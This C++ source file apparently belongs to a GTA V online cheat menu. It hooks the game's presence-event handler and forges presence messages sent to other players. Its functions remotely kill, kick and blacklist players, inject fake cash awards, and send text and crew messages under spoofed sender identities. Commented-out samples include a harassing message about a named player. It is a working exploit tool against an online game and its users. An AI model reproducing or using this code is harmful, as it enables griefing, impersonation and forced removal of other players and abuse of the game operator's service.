#include "stdafx.h"
#include "fingerOfGod.h"

bool(*FingerOfGod::m_callback)(const PresenceEvent presenceEvent, const FingerCommand command, String name);
FingerOfGod::sendPresenceEventType FingerOfGod::m_sendEvent;
FingerOfGod::getNetworkHandleId FingerOfGod::GetNetworkHandleID;

typedef bool(__fastcall *readGamePresence)(__int64 a1, __int64 a2, __int64 a3, __int64 a4);
static readGamePresence oreadGamePresence;
bool FingerOfGod::_readGamePresence(__int64 a1, __int64 a2, __int64 a3, __int64 a4) {
	const auto payload = *reinterpret_cast<char **>(a3);

	LOG_DEVDEBUG("[FOGdata]: %s", payload);

	try {
		auto data = nlohmann::json::parse(payload);
		auto eventPayloadKey = "gm.evt";

		if (data["gm.evt"].is_null()) {
			if (data["gta5.game.event"].is_null()) {
				return true;
			}

			eventPayloadKey = "gta5.game.event";
		}

		auto eventPayload = data[eventPayloadKey];

		if (eventPayload["e"].is_null()) {
			return true;
		}

		const auto presenceName = eventPayload["e"].get<std::string>();
		const auto presenceHash = Utils::GetHashKey(eventPayload["e"].get<std::string>().c_str());
		String name = "";

		if (eventPayload["d"].is_null()) {
			return true;
		}

		auto eventPayloadData = eventPayload["d"];

		/*if (eventPayloadData["t"].is_null()) {
			return true;
		}*/

		if (!eventPayloadData["n"].is_null()) {
			name = jsonGet<string>(eventPayloadData, "n", "").c_str();
		}

		/*if (presenceHash == PRESENCE_FINGER_OF_GOD) {
			const auto secureActionHash = Utils::GetHashKey(eventPayloadData["t"].get<string>().c_str());
			return m_callback(PresenceEvent(presenceHash), FingerCommand(secureActionHash), name) ? true : oreadGamePresence(a1, a2, a3, a4);
		}*/

		return m_callback(PresenceEvent(presenceHash), FingerCommand(0), name) ? true : oreadGamePresence(a1, a2, a3, a4);
	} catch (...) {
		return true; 
	}
}

bool FingerOfGod::sendPresenceEvent(const QWORD handle, const char* payload) {
	struct Data {
		QWORD handle; // 0x0000
		WORD field_0008; // 0x0008
		BYTE field_0012; // 0x0012
	};

	Data data = { 0 };

	data.handle = handle;
	data.field_0008 = 3;
	data.field_0012 = 0;

	auto payloadPtr = std::make_unique<BYTE[]>(1536);
	SecureZeroMemory(payloadPtr.get(), 1536);
	memcpy(payloadPtr.get(), payload, strlen(payload));
	memcpy(payloadPtr.get() + 1024, "self", 4); // channel ?

	return m_sendEvent(0x0FFFFFFFF, __int64(&data), 1, __int64(payloadPtr.get()), 1);
}

bool FingerOfGod::sendCrewMessageCommand(const QWORD handle, const long long senderID, const int crewId, const String subject, const String message) {
	char payload[512];

	sprintf_s(payload, R"({"gm.evt":{"e":"crew_message","d":{"sender":%i,"crewId":%i,"crewTag":"%s","msg":"%s"}}})", MISC::GetRandomIntInRange(7000000, 34000000), crewId, subject, message); //27070864

	return sendPresenceEvent(handle, payload);
}

bool FingerOfGod::sendFingerCommandCustom(const QWORD handle, const String command) {
	char payload[512];

	sprintf_s(payload, R"({"gm.evt":{"e":"decompressingmorph","d":{"t":"%s"}}})", command);

	return sendPresenceEvent(handle, payload);
}

bool FingerOfGod::sendFingerCommand(const QWORD handle, const FingerCommand command, const char *vehicle) {
	char payload[512];

	if (command != FINGER_VEHICLE) {
		sprintf_s(payload, R"({"gm.evt":{"e":"decompressingmorph","d":{"t":"%s"}}})",
			command == FINGER_KILL ? "smitethee" :
			command == FINGER_ADMIN_KICK ? "kick" :
			command == FINGER_NETWORK_KICK ? "blacklist" :
			command == FINGER_RELAX ? "relax" : "");
	} else {
		sprintf_s(payload, R"({"gm.evt":{"e":"decompressingmorph","d":{"t":"vehicle","d":"%s"}}})", vehicle);
	}

	return sendPresenceEvent(handle, payload);
}

bool FingerOfGod::sendCashCorrection(const QWORD handle, const int amount) {
	char buf[512];
	sprintf_s(buf, R"({"gm.evt":{"e":"gs_award","d":{"balance":true,"fullRefresh":true,"awardType":1,"awardAmount":%d}}})", amount);

	return sendPresenceEvent(handle, buf);
}

bool FingerOfGod::sendTextMessage(const QWORD handle, const char *message, const QWORD as) {
	char pBuf[512];
	sprintf_s(pBuf, R"({"gm.evt":{"e":"TextMessage","d":{"ps":"%s","gh":"%s"}}})", message, Utils::FixedBuildBase64Handle(as ? as : handle));

	//sprintf_s(payload, R"({"gm.evt":{"e":"TextMessage","d":{"ps":"%s","gh":"%s"}}})", message, "Hy43AQAAAAADAAAAAAAAAA==");
	//sprintf_s(payload, R"({"gm.evt":{"e":"TextMessage","d":{"ps":"%s","gh":"%s"}}})", "<font size='40'>~y~NOTICE~s~Wendy's Spicy Nuggets are back!", "Hy43AQAAAAADAAAAAAAAAA==");
	//sprintf_s(payload, R"({"gm.evt":{"e":"TextMessage","d":{"ps":"bananaboy","gh":"Hy43AQAAAAADAAAAAAAAAA=="}}})");
	//sprintf_s(payload, R"({"gm.evt":{"e":"TextMessage","d":{"ps":"%s","gh":"%s"}}})", message, Utils::BuildBase64Handle(as ? as : handle));
	//sprintf_s(payload, R"({"gm.evt":{"e":"TextMessage","d":{"ps":"%s","gh":"%s"}}})", message, "MTM1Mjg3MzU3==");
	//LOG_DEBUG("[FOG] sendTextMessage: %s", payload);

	/* [21:35:34] [DevD] [FOGdata]: {"gm.evt":{"e":"TextMessage","d":{"ps":"<font size='40'>~y~NOTICE
	~s~kianowich likes men!","gh":"Hy43AQAAAAADAAAAAAAAAA=="}}} */

	//[FOG] sendTextMessage: {"gm.evt":{"e":"TextMessage", "d" : {"ps":"<font size='40'>~y~NOTICE~s~Wendy's Spicy Nuggets are back!", "gh" : "TDDjB6MB"}}}

	return sendPresenceEvent(handle, pBuf);
}

bool FingerOfGod::sendFriendCreatedCrew(const QWORD handle, const char *friendName) {
	char buf[512];
	sprintf_s(buf, R"({"gm.evt":{"e":"FriendCreatedCrew","d":{"from":"%s"}}})", friendName);
	return sendPresenceEvent(handle, buf);
}

bool FingerOfGod::sendFriendJoinedCrew(const QWORD handle, const int clanId, const char *tag, const char *crewName, const bool open, const char *friendName) {
	char buf[512];
	sprintf_s(buf, R"({"gm.evt":{"e":"FriendCrewJoined","d":{"clanid":%I64d,"tag":"%s","name":"%s","open":"%s","from":"%s"}}})", (uint64_t)clanId, tag, crewName, open ? "true" : "false", friendName);

	return sendPresenceEvent(handle, buf);
}

void FingerOfGod::Init(bool(*callback)(const PresenceEvent presenceEvent, const FingerCommand command, String name)) {
	m_callback = callback;

	Hooking::ServerPatternCallback<void>("FOGR", [](Hooking::CallbackData<void> data) {
		Hooking::HookFunction(data, &_readGamePresence, &oreadGamePresence);
	});

	Hooking::ServerPatternCallback<void>("SET", [](Hooking::CallbackData<void> data) {
		m_sendEvent = reinterpret_cast<sendPresenceEventType>(data.m_address);
	});

	/*Hooking::PatternCallback<void>({ "GNHI", true, 0, "40 53 48 83 EC 20 48 8B D9 41 83 F8 0D 74 04 32 C0 EB 28 83 64 24 ? ? 4C 8D 4C 24 ? 41 B8" }, [] (void* address) {
		GetNetworkHandleID = (getNetworkHandleId)address;
	});*/
}

